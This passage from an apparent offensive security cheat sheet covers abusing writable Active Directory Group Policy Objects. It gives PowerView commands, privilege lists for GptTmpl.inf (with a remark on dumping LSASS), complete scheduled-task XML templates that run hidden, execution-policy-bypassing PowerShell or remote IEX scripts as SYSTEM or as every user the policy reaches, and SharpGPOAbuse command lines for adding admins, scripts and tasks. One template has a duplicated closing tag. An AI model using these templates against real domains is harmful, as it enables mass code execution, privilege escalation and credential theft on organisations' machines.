Get-DomainGPO -Identity "<GPO_NAME | GPO_GUID>" | Set-DomainObject -Set @{'gPCMachineExtensionNames'='<{EXISTING_GUID}{NEW_GUID}[...]>'}
```

###### [Example - GPO Machine] User rights

The `GptTmpl.inf` file, located in
`\\<DOMAIN>\SYSVOL\<DOMAIN_FQDN>\Policies\<GPO_GUID>\MACHINE\Microsoft\Windows
NT\SecEdit\`, can be edited to add user rights to the specified domain or local
user.

From an opsec perspective, note that modifying a GPO `[Privilege Rights]`
assignation may override another assignation in a GPO with a lower precedence
order, resulting in a possible loss of access for legitimate personal. It is
thus recommended to first enumerate all GPO being applied on the Organizational
Unit before undertaking any changes.

The full list of privileges assign to an user when being added as a member of
the local built-in Administrators group is as follow. The
`SeRemoteInteractiveLogonRight` and `SeDebugPrivilege` privileges are enough to
dump the `LSASS` process through a Remote Desktop access.

```
# SePriv = *<SID>
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeBatchLogonRight
SeChangeNotifyPrivilege
SeCreatePagefilePrivilege
SeDebugPrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeInteractiveLogonRight
SeLoadDriverPrivilege
SeMachineAccountPrivilege
SeNetworkLogonRight
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemTimePrivilege
SeTakeOwnershipPrivilege
SeUndockPrivilege
SeEnableDelegationPrivilege
```

The following GUID must be added in the `gPCMachineExtensionNames` attribute if
user rights and privileges are defined in the GPO:

```
[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
```

###### [Example - GPO Computer / User] Immediate task

An immediate task is a task that will be run as soon as the client the GPO is
applied to, a computer or an user, refresh its Group Policy.

Computer immediate task can be run under the `NT AUTHORITY\SYSTEM` local
built-in account while user immediate task may only run under the identity of
the domain account opening the session (with out specifying password,
otherwise the tasks impersonate the given domain account).

*Computer immediate task*

A computer immediate task can be created using the `Group Policy Management`
utility:
  - Right click on the GPO -> `Edit...`
  - Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks
  - Right click -> New -> Immediate Task (At least Windows 7)
  - "When running the task, use the following user account:", specify `NT AUTHORITY\System`
  - Check "Run with highest privileges" and "Hidden"
  - Actions -> New -> "Start a program" -> powershell.exe or cmd.exe with the command to be executed as argument.

Or using the following template, in the `ScheduledTasks` file, that will create
an immediate task running under the `NT AUTHORITY\SYSTEM` account the specified
PowerShell script `<INLINE-POWERSHELL | IEX_REMOTE_SCRIPT>`, with three
retries, one every minute.

The computer immediate task GPO file paths is:
  - `\\<DOMAIN>\SYSVOL\<DOMAIN_FQDN>\Policies\<GPO_GUID>\Machine\Preferences\ScheduledTasks`

```
# Update <DOMAIN> and <INLINE-POWERSHELL | IEX_REMOTE_SCRIPT>

<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="TEST" image="0" changed="2019-12-14 22:34:06" uid="{BFC35203-A437-4104-90DD-32DC39E2BA39}"><Properties action="C" name="TEST" runAs="NT AUTHORITY\System" logonType="S4U"><Task version="1.3"><RegistrationInfo><Author><DOMAIN>\Admininistrator</Author><Description></Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command><Arguments>-nop -Win Hidden -exec bypass -c "<INLINE-POWERSHELL | IEX_REMOTE_SCRIPT>"</Arguments></Exec>
				</Actions></Task></Properties></ImmediateTaskV2>
</ScheduledTasks>
```

The following GUID must be added in the `gPCMachineExtensionNames` attribute in
order to make the immediate task effective:

```
[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]
```

*User immediate task*

An user immediate task can be created using the `Group Policy Management`
utility:
  - Right click on the GPO -> `Edit...`
  - User Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks
  - Right click -> New -> Immediate Task (At least Windows 7)
  - "When running the task, use the following user account:", specify `%LogonDomain%\%LogonUser%`
  - Check "Run with highest privileges" and "Hidden"
  - Actions -> New -> "Start a program" -> powershell.exe or cmd.exe with the command to be executed as argument. In order to hide the PowerShell console to the affected user, the `-Win Hidden` flag must be specified.

Or using the following template, in the `ScheduledTasks` file, that will create
an immediate task running, under the identity of any account on which the GPO
is applied, the specified PowerShell script
`<INLINE-POWERSHELL | IEX_REMOTE_SCRIPT>`, with three retries, one every
minute.

The user immediate task GPO file paths is:
  - `\\<DOMAIN>\SYSVOL\<DOMAIN_FQDN>\Policies\<GPO_GUID>\USER\Preferences\ScheduledTasks`

```
# Update <DOMAIN> and <INLINE-POWERSHELL | IEX_REMOTE_SCRIPT>

<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="TEST" image="0" changed="2019-12-15 13:23:18" uid="{2EC4BE03-2A6A-4C50-A0E6-7FBEA834E265}"><Properties action="C" name="TEST" runAs="%LogonDomain%\%LogonUser%" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author><DOMAIN>\Administrator</Author><Description></Description></RegistrationInfo><Principals><Principal id="Author"><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command><Arguments>-nop -Win Hidden -exec bypass -c "<INLINE-POWERSHELL | IEX_REMOTE_SCRIPT>"</Arguments></Arguments></Exec>
				</Actions></Task></Properties></ImmediateTaskV2>
</ScheduledTasks>
```

The following GUID must be added in the `gPCUserExtensionNames` attribute in
order to make the immediate task effective:

```
[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]
```

###### SharpGPOAbuse

`SharpGPOAbuse` is a C# tool that can be used to automate the process of
exploiting an editable GPO. The utility supports the following exploitation
techniques:
  - add the specified rights to a domain user
  - add a domain user to the local Administrators group of the computer
  - add a new computer start up script
  - add a new user logon script
  - add a computer or user immediate task

```
# SharpGPOAbuse can be run on an out of the domain computer through a runas session
runas /NetOnly /user:<DOMAIN>\<USERNAME> powershell.exe
SharpGPOAbuse.exe --DomainController <DC_IP> --Domain <DOMAIN>

# Add the specified rights to an user
# The privileges are specified in a case sensitive comma separated list
# The \\<DOMAIN>\SYSVOL\<DOMAIN_FQDN>\Policies\<GPO_GUID>\MACHINE\Microsoft\Windows
NT\SecEdit\GptTmpl.inf file should includes the specified privileges with the given account SID
SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeDebugPrivilege,SeAuditPrivilege,SeRemoteInteractiveLogonRight" --UserAccount "<DOMAIN>\<USERNAME>" --GPOName "<GPO_NAME>"

# Add a domain user to the local Administrators group of the computer
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "<DOMAIN>\<USERNAME>" --GPOName "<GPO_NAME>"

# Add a new computer start up or user logon script
# Refer to the "General - Shells" note for starting a reverse PowerShell  
SharpGPOAbuse.exe <--AddUserScript | --AddComputerScript> --ScriptName "<SCRIPT_NAME>" --ScriptContents "<SCRIPT>" --GPOName "<GPO_NAME>"
SharpGPOAbuse.exe <--AddUserScript | --AddComputerScript> --ScriptName "GPO_script.ps1" --ScriptContents "powershell.exe -nop -w hidden -c \"<INLINE-POWERSHELL | IEX_REMOTE_SCRIPT>\"" --GPOName "<GPO_NAME>"

# Add a new computer or user immediate task
# For some reason starting the --Arguments with "-nop" make SharpGPOAbuse raise an "Unknown argument error"
SharpGPOAbuse.exe <--AddUserTask | --AddComputerTask> --TaskName "<TASKNAME>" --Author "<DOMAIN>\Admininistrator" --Command "cmd.exe | BINARY_PATH>" --Arguments "<ARGUMENTS | /c powershell.exe -nop -w hidden -c \"<INLINE-POWERSHELL | IEX_REMOTE_SCRIPT>\">" --GPOName "<GPO_NAME>"
```
